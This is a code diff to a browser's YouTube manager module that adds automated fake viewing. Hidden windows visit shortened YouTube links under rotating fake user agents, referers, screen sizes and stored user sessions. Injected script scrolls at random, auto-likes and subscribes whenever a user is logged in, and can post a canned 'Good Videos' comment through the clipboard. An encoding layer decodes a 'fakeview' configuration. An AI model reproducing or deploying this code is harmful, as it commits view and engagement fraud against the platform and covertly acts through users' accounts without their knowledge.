@@ -12,61 +12,120 @@
         value: '360',
     };
     SOCIALBROWSER.youtubeManager = {
-        currentIndex: 0,
-        visitOptions: { show: false, timeout: 1000 * 60 * 20, url: 'https://www.youtube.com/watch?v=PpDoLqPZg5M', host: 'youtube', referer: 'dynamic', proxy: null, partition: null, scroll: true },
+        currentIndex: -1,
+        sleep: 1000 * 60 * 5,
+        visitOptions: { show: false, timeout: 1000 * 60 * 20, url: 'https://bit.ly/3aBjyoX', host: 'youtube', referer: 'dynamic', proxy: null, partition: null, scroll: false, count: 1 },
+        trackingList: [],
         visitList: [
-            { title: 'sharepoint admin 2016', url: 'https://bit.ly/34p86d9', timeout: 1000 * 60 * 65 },
+            { title: 'ازاى المواقع بتعرف انت مين', url: 'https://bit.ly/3aBjyoX', timeout: 1000 * 60 * 20 },
+            { title: 'متصفح لحماية الاطفال ومانع للاعلانات', url: 'https://bit.ly/3sqPXGv', timeout: 1000 * 60 * 20 },
+            { title: 'زيادة مشاهدات اليوتيوب addmefast', url: 'https://bit.ly/3nYMBqY', timeout: 1000 * 60 * 15 },
+            { title: 'scripts now - download', url: 'https://bit.ly/3qIL62c', timeout: 1000 * 60 * 2 },
+            { title: 'تحميل الافلام من المواقع بدون اعلانات', url: 'https://bit.ly/3FCa8Hr', timeout: 1000 * 60 * 3 },
+            { title: 'Cima4u - YouTube', url: 'https://bit.ly/3x7NRyi', timeout: 1000 * 60 * 10 },
+            { title: 'wintube com | sites scam on users', url: 'https://bit.ly/3oAQiDL', timeout: 1000 * 60 * 10 },
             { title: 'nodejs chat', url: 'https://bit.ly/3w5T5JH', timeout: 1000 * 60 * 50 },
             { title: 'MVC 5 Review', url: 'https://bit.ly/3wmkQhd', timeout: 1000 * 60 * 75 },
             { title: 'c# Review', url: 'https://bit.ly/2SKI9CG', timeout: 1000 * 60 * 75 },
             { title: 'c# winforms Review', url: 'https://bit.ly/3qpT015', timeout: 1000 * 60 * 75 },
-            { title: 'ازاى المواقع بتعرف انت مين وازى تخفى هويتك اثناء التصفح', url: 'https://bit.ly/3aBjyoX', timeout: 1000 * 60 * 30 },
-            { title: 'متصفح لحماية الاطفال ومانع للاعلانات', url: 'https://bit.ly/3sqPXGv', timeout: 1000 * 60 * 20 },
-            { title: 'زيادة مشاهدات اليوتيوب addmefast', url: 'https://bit.ly/3nYMBqY', timeout: 1000 * 60 * 15 },
-            { title: 'برنامج نقاط البيع - السعر والمميزات', url: 'https://bit.ly/3senq6h', timeout: 1000 * 60 * 41 },
-            { title: 'برنامج نقاط البيع - تركيب وتشغيل', url: 'https://bit.ly/2Nqnnpd', timeout: 1000 * 60 * 9 },
-            { title: 'برنامج نقاط البيع - الاعدادات', url: 'https://bit.ly/3qEtQeL', timeout: 1000 * 60 * 36 },
-            { title: 'scripts now - download', url: 'https://bit.ly/3qIL62c', timeout: 1000 * 60 * 2 },
+            { title: 'sharepoint admin 2016', url: 'https://bit.ly/34p86d9', timeout: 1000 * 60 * 65 },
         ],
         refererList: [
+            'https://www.facebook.com/',
+            'https://twitter.com/',
+            'https://www.instagram.com/',
+            'https://www.pinterest.com/',
+            'https://www.reddit.com/',
+            'https://www.tumblr.com/',
+            'https://www.tiktok.com/',
             'https://flipboard.com/',
             'https://vk.com/',
             'https://getpocket.com/',
             'https://digg.com/video',
-            'https://www.pinterest.com/',
             'https://www.linkedin.com/',
-            'https://www.reddit.com/',
-            'https://twitter.com/',
-            'https://www.tiktok.com/',
             'https://qzone.qq.com/',
-            'https://www.tumblr.com/',
-            'https://www.instagram.com/',
             'https://web.wechat.com/?lang=en',
             'https://web.whatsapp.com/',
-            'https://www.facebook.com/',
         ],
-        userAgentList: [],
-        scrrenSizeList: ['1366x768', '1280x768', '1280x768', '1280x768', '1024x768', '1280x720', '1366x768', '1280x768'],
+        userAgentList: [
+            { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' },
+            { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' },
+            { url: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' },
+            { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.36 Mobile/15E148 Safari/604.1' },
+            { url: 'Mozilla/5.0 (iPad; CPU OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.36 Mobile/15E148 Safari/604.1' },
+            { url: 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36' },
+            { url: 'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36' },
+            { url: 'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36' },
+            { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0' },
+            { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.0; rv:94.0) Gecko/20100101 Firefox/94.0' },
+            { url: 'Mozilla/5.0 (X11; Linux i686; rv:94.0) Gecko/20100101 Firefox/94.0' },
+            { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/95.0.1020.53' },
+            { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/81.0.4196.37' },
+        ],
+        scrrenSizeList: ['1920x1080', '1536x864', '1366x768', '1280x768', '1024x768', '1280x720'],
+        screenIndex: -1,
         randomScreenSize: function () {
-            return SOCIALBROWSER.youtubeManager.scrrenSizeList[Math.floor(Math.random() * SOCIALBROWSER.youtubeManager.scrrenSizeList.length)];
+            if (SOCIALBROWSER.youtubeManager.scrrenSizeList.length > 0) {
+                SOCIALBROWSER.youtubeManager.screenIndex++;
+                if (SOCIALBROWSER.youtubeManager.scrrenSizeList.length <= SOCIALBROWSER.youtubeManager.screenIndex) {
+                    SOCIALBROWSER.youtubeManager.screenIndex = 0;
+                }
+                return SOCIALBROWSER.youtubeManager.scrrenSizeList[SOCIALBROWSER.youtubeManager.screenIndex];
+            } else {
+                return '1366x768';
+            }
         },
+        agentIndex: -1,
         randomUserAgent: function () {
-            return SOCIALBROWSER.var.user_agent_list[Math.floor(Math.random() * SOCIALBROWSER.var.user_agent_list.length)];
+            if (SOCIALBROWSER.youtubeManager.userAgentList.length > 0) {
+                SOCIALBROWSER.youtubeManager.agentIndex++;
+                if (SOCIALBROWSER.youtubeManager.userAgentList.length <= SOCIALBROWSER.youtubeManager.agentIndex) {
+                    SOCIALBROWSER.youtubeManager.agentIndex = 0;
+                }
+                return SOCIALBROWSER.youtubeManager.userAgentList[SOCIALBROWSER.youtubeManager.agentIndex];
+            } else {
+                return null;
+            }
         },
+        refererIndex: -1,
         randomReferer: function () {
-            return SOCIALBROWSER.youtubeManager.refererList[Math.floor(Math.random() * SOCIALBROWSER.youtubeManager.refererList.length)];
+            if (SOCIALBROWSER.youtubeManager.refererList.length > 0) {
+                SOCIALBROWSER.youtubeManager.refererIndex++;
+                if (SOCIALBROWSER.youtubeManager.refererList.length <= SOCIALBROWSER.youtubeManager.refererIndex) {
+                    SOCIALBROWSER.youtubeManager.refererIndex = 0;
+                }
+                return SOCIALBROWSER.youtubeManager.refererList[SOCIALBROWSER.youtubeManager.refererIndex];
+            } else {
+                return 'https://www.facebook.com/';
+            }
         },
+        userIndex: -1,
         randomPartition: function () {
-            return SOCIALBROWSER.var.session_list[Math.floor(Math.random() * SOCIALBROWSER.var.session_list.length)].name;
+            if (SOCIALBROWSER.var.session_list.length > 0) {
+                SOCIALBROWSER.youtubeManager.userIndex++;
+                if (SOCIALBROWSER.var.session_list.length <= SOCIALBROWSER.youtubeManager.userIndex) {
+                    SOCIALBROWSER.youtubeManager.userIndex = 0;
+                }
+                return SOCIALBROWSER.var.session_list[SOCIALBROWSER.youtubeManager.userIndex].name;
+            } else {
+                return 'ghost_' + Date.now();
+            }
         },
         randomVisit: function () {
             if (SOCIALBROWSER.youtubeManager.visitList.length > 0) {
-                return SOCIALBROWSER.youtubeManager.visitList[Math.floor(Math.random() * SOCIALBROWSER.youtubeManager.visitList.length)];
+                SOCIALBROWSER.youtubeManager.currentIndex++;
+                if (SOCIALBROWSER.youtubeManager.visitList.length <= SOCIALBROWSER.youtubeManager.currentIndex) {
+                    SOCIALBROWSER.youtubeManager.currentIndex = -1;
+                    SOCIALBROWSER.youtubeManager.prepareVisits();
+                    return null;
+                }
+                return SOCIALBROWSER.youtubeManager.visitList[SOCIALBROWSER.youtubeManager.currentIndex];
             } else {
-                return SOCIALBROWSER.youtubeManager.visitOptions;
+                return null;
             }
         },
         prepareVisits: function () {
+            SOCIALBROWSER.log('youtubeManager.prepareVisits()');
             SOCIALBROWSER.fetchJson(
                 {
                     url: SOCIALBROWSER.server_url + '/api/youtube_list',
@@ -74,6 +133,9 @@
                 },
                 function (data) {
                     if (data.done && data.list && data.list.length > 0) {
+                        if (data.reset) {
+                            SOCIALBROWSER.youtubeManager.trackingList = [];
+                        }
                         SOCIALBROWSER.youtubeManager.visitList = [];
                         data.list.forEach((v) => {
                             SOCIALBROWSER.youtubeManager.visitList.push(v);
@@ -116,6 +178,9 @@
             win.setSkipTaskbar(false);
             win.showInactive();
             win.openDevTools();
+            win.webContents.on('context-menu', (event, params) => {
+                win.webContents.send('context-menu', params);
+            });
         } else {
             if (options.show) {
                 win.maximize();
@@ -139,7 +204,8 @@
             options.referer = SOCIALBROWSER.youtubeManager.randomReferer();
         }
 
-        let code_injected = `if (!window.SOCIALBROWSER) {
+        let code_injected =
+            `if (!window.SOCIALBROWSER) {
     window.SOCIALBROWSER = {
         var: {
             core: { id: '' },
@@ -171,7 +237,103 @@ window.open = function (url) {
 localStorage.clear = () => {
     console.log('User Request Clear LocalStorage');
 };
-` +  `console.log(' [ YOUTUBE ] ');
+
+if (!SOCIALBROWSER.isIframe() && '${options.scroll}' == 'true') {
+    function scrollRandom() {
+        if (SOCIALBROWSER.scrollStop) {
+            return;
+        }
+
+        let y = window.scrollY;
+        y = y + (Math.floor(Math.random() * 150) + 50);
+        if (document.body && window.innerHeight + window.scrollY >= document.body.offsetHeight) {
+            y = 0;
+            document.documentElement.scrollTop = 0;
+        }
+        window.scrollTo(0, y);
+
+        setTimeout(() => {
+            scrollRandom();
+        }, 1000 * (Math.floor(Math.random() * 5) + 1));
+    }
+
+    setTimeout(() => {
+        scrollRandom();
+    }, 1000 * 20);
+}
+
+if (!SOCIALBROWSER.from123) {
+    SOCIALBROWSER.$base64Letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+    SOCIALBROWSER.$base64Numbers = [];
+    for (let $i = 11; $i < 99; $i++) {
+        if ($i % 10 !== 0 && $i % 11 !== 0) {
+            SOCIALBROWSER.$base64Numbers.push($i);
+        }
+    }
+
+    SOCIALBROWSER.toJson = (obj) => {
+        if (typeof obj === undefined || obj === null) {
+            return '';
+        }
+        return JSON.stringify(obj);
+    };
+
+    SOCIALBROWSER.fromJson = (str) => {
+        if (typeof str !== 'string') {
+            return str;
+        }
+        return JSON.parse(str);
+    };
+
+    SOCIALBROWSER.toBase64 = (str) => {
+        if (typeof str === undefined || str === null || str === '') {
+            return '';
+        }
+        if (typeof str !== 'string') {
+            str = SOCIALBROWSER.toJson(str);
+        }
+        return btoa(unescape(encodeURIComponent(str)));
+    };
+
+    SOCIALBROWSER.fromBase64 = (str) => {
+        if (typeof str === undefined || str === null || str === '') {
+            return '';
+        }
+        return decodeURIComponent(escape(atob(str)));
+    };
+
+    SOCIALBROWSER.to123 = (data) => {
+        data = SOCIALBROWSER.toBase64(data);
+        let newData = '';
+        for (let i = 0; i < data.length; i++) {
+            let letter = data[i];
+            newData += SOCIALBROWSER.$base64Numbers[SOCIALBROWSER.$base64Letter.indexOf(letter)];
+        }
+        return newData;
+    };
+
+    SOCIALBROWSER.from123 = (data) => {
+        let newData = '';
+        for (let i = 0; i < data.length; i++) {
+            let num = data[i] + data[i + 1];
+            let index = SOCIALBROWSER.$base64Numbers.indexOf(parseInt(num));
+            newData += SOCIALBROWSER.$base64Letter[index];
+            i++;
+        }
+        newData = SOCIALBROWSER.fromBase64(newData);
+        return newData;
+    };
+
+    SOCIALBROWSER.typeOf = SOCIALBROWSER.typeof = function type(elem) {
+        return Object.prototype.toString.call(elem).slice(8, -1);
+    };
+}
+
+if (SOCIALBROWSER.fakeview123) {
+    SOCIALBROWSER.fakeview = JSON.parse(SOCIALBROWSER.from123(SOCIALBROWSER.fakeview123));
+}
+` +
+            `console.log(' [ YOUTUBE ] ');
 
 if (SOCIALBROWSER && SOCIALBROWSER.var) {
     SOCIALBROWSER.var.blocking.core = SOCIALBROWSER.var.blocking.core || {};
@@ -208,6 +370,89 @@ function __document__ready__() {
             document.location.href = '${options.url}';
         }, 20 * 1000);
     } else {
+        SOCIALBROWSER.YOUTUBE = {
+            PLAYER: '#movie_player',
+            SUBSCRIBE_BUTTON: '#subscribe-button > ytd-subscribe-button-renderer > tp-yt-paper-button',
+            LIKE_BUTTON: 'ytd-video-primary-info-renderer #top-level-buttons-computed > ytd-toggle-button-renderer:nth-child(1)',
+            DISLIKE_BUTTON: 'ytd-video-primary-info-renderer #top-level-buttons-computed > ytd-toggle-button-renderer:nth-child(2)',
+            NOTIFICATION: 'ytd-popup-container',
+            LIKE_BUTTON_CLICKED_CLASS: 'style-default-active',
+            COMMENT_BOX: 'ytd-comment-simplebox-renderer #simplebox-placeholder',
+            COMMENT_SUBMIT: '#buttons #submit-button',
+            isUserLogin: function () {
+                return document.querySelector('a[href^="https://accounts.google.com/ServiceLogin"]') ? false : true;
+            },
+            scrollDown: function () {
+                let y = window.scrollY + 50;
+                window.scrollTo(0, y);
+            },
+            scrollUp: function () {
+                let y = window.scrollY - 50;
+                window.scrollTo(0, y);
+            },
+            comment: function () {
+                if ((box = document.querySelector(SOCIALBROWSER.YOUTUBE.COMMENT_BOX))) {
+                    box.scrollIntoView(false);
+                    box.click();
+                    let old_copy = SOCIALBROWSER.remote.clipboard.readText();
+                    SOCIALBROWSER.remote.clipboard.writeText('Good Videos');
+                    SOCIALBROWSER.webContents.paste();
+                    setTimeout(() => {
+                        if ((submit = document.querySelector(SOCIALBROWSER.YOUTUBE.COMMENT_SUBMIT))) {
+                            submit.scrollIntoView(false);
+                            submit.click();
+                        }
+                        SOCIALBROWSER.remote.clipboard.writeText(old_copy);
+                    }, 1000 * 5);
+                } else {
+                    SOCIALBROWSER.YOUTUBE.scrollDown();
+                    setTimeout(() => {
+                        SOCIALBROWSER.YOUTUBE.comment();
+                    }, 1000);
+                }
+            },
+            isSubscribed: function () {
+                let subscribeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.SUBSCRIBE_BUTTON);
+                if (!subscribeButton) {
+                    return false;
+                }
+                const subscribed = subscribeButton.hasAttribute('subscribed');
+                return subscribed;
+            },
+            subscribe: function () {
+                let subscribeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.SUBSCRIBE_BUTTON);
+                if (!subscribeButton) {
+                    return false;
+                }
+                let subscribed = subscribeButton.hasAttribute('subscribed');
+                if (subscribed) {
+                    return true;
+                } else {
+                    subscribeButton.click();
+                    return true;
+                }
+            },
+            like: function () {
+                const likeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.LIKE_BUTTON);
+                if (!likeButton) {
+                    return false;
+                }
+                if (likeButton.classList.contains(SOCIALBROWSER.YOUTUBE.LIKE_BUTTON_CLICKED_CLASS)) {
+                    return true;
+                } else {
+                    likeButton.click();
+                    return true;
+                }
+            },
+        };
+
+        setInterval(() => {
+            if (SOCIALBROWSER.YOUTUBE.isUserLogin()) {
+                SOCIALBROWSER.YOUTUBE.like();
+                SOCIALBROWSER.YOUTUBE.subscribe();
+            }
+        }, 1000 * 30);
+
         setInterval(() => {
             if (SOCIALBROWSER.video_player) {
                 SOCIALBROWSER.video_player.playVideo();
@@ -218,24 +463,9 @@ function __document__ready__() {
                     d.click();
                 }
             });
+
             document.querySelectorAll('iron-overlay-backdrop').forEach((d) => d.remove());
             document.querySelectorAll('#dialog').forEach((d) => d.remove());
-
-            let is_user_login = document.querySelector('a[href^="https://accounts.google.com/ServiceLogin"]') ? false : true;
-            if (is_user_login) {
-                let like_btn = document.querySelector('#top-level-buttons ytd-toggle-button-renderer');
-                if (like_btn && !like_btn.className.like('*style-default-active*')) {
-                    let a = like_btn.querySelector('a');
-                    if (a) {
-                        a.click();
-                    }
-                }
-
-                let subscribed_btn = document.querySelector('#subscribe-button.style-scope.ytd-video-secondary-info-renderer paper-button');
-                if (subscribed_btn && !subscribed_btn.hasAttribute('subscribed')) {
-                    subscribed_btn.click();
-                }
-            }
 
             if (document.location.href.indexOf('consent') !== -1) {
                 let btn = document.querySelector('form input[type=submit]') || document.querySelector('form button');
@@ -246,7 +476,10 @@ function __document__ready__() {
         }, 1000 * 5);
 
         if (SOCIALBROWSER && SOCIALBROWSER.setPlaybackQuality) {
-            SOCIALBROWSER.var.blocking.youtube.quality = SOCIALBROWSER.var.video_quality_list[2];
+            SOCIALBROWSER.var.blocking.youtube.quality = {
+                name: 'medium',
+                value: '360',
+            };
             SOCIALBROWSER.setPlaybackQuality();
         }
     }
@@ -288,7 +521,9 @@ if (document.readyState !== 'loading') {
         });
 
         win.on('closed', function () {
-            SOCIALBROWSER.youtubeManager.runFakeVisit();
+            setTimeout(() => {
+                SOCIALBROWSER.youtubeManager.runFakeVisit();
+            }, options.timeout);
         });
 
         win.webContents.on('did-fail-load', function (e) {
@@ -307,17 +542,46 @@ if (document.readyState !== 'loading') {
             }
         }, options.timeout);
     };
-
+    SOCIALBROWSER.youtubeManager.Tracking = function (v) {
+        let t = null;
+        SOCIALBROWSER.youtubeManager.trackingList.forEach((track) => {
+            if (track.url == v.url) {
+                track.count++;
+                t = track;
+            }
+        });
+        if (!t) {
+            t = {
+                url: v.url,
+                count: 1,
+            };
+            SOCIALBROWSER.youtubeManager.trackingList.push(t);
+        }
+        return t;
+    };
     SOCIALBROWSER.youtubeManager.runFakeVisit = function () {
         setTimeout(() => {
-            SOCIALBROWSER.youtubeManager.createFakeVisitWindow(SOCIALBROWSER.youtubeManager.randomVisit());
-        }, 1000 * 60 * 5); /** for cpu relax */
+            let v = SOCIALBROWSER.youtubeManager.randomVisit();
+            if (v) {
+                let track = SOCIALBROWSER.youtubeManager.Tracking(v);
+                if (v.count && v.count < track.count) {
+                    SOCIALBROWSER.youtubeManager.runFakeVisit();
+                } else {
+                    SOCIALBROWSER.youtubeManager.sleep = v.timeout;
+                    SOCIALBROWSER.youtubeManager.createFakeVisitWindow(v);
+                }
+            } else {
+                SOCIALBROWSER.youtubeManager.runFakeVisit();
+            }
+        }, 1000 * 60);
     };
 
     SOCIALBROWSER.youtubeManager.prepareVisits();
     SOCIALBROWSER.youtubeManager.runFakeVisit();
-
+    SOCIALBROWSER.youtubeManager.startTime = Date.now();
     setInterval(() => {
-        SOCIALBROWSER.youtubeManager.prepareVisits();
-    }, 1000 * 60 * 50);
+        if (Date.now() - SOCIALBROWSER.youtubeManager.startTime > 1000 * 60 * 60 * 24) {
+            SOCIALBROWSER.youtubeManager.trackingList = [];
+        }
+    }, 1000 * 60 * 60);
 })(window);
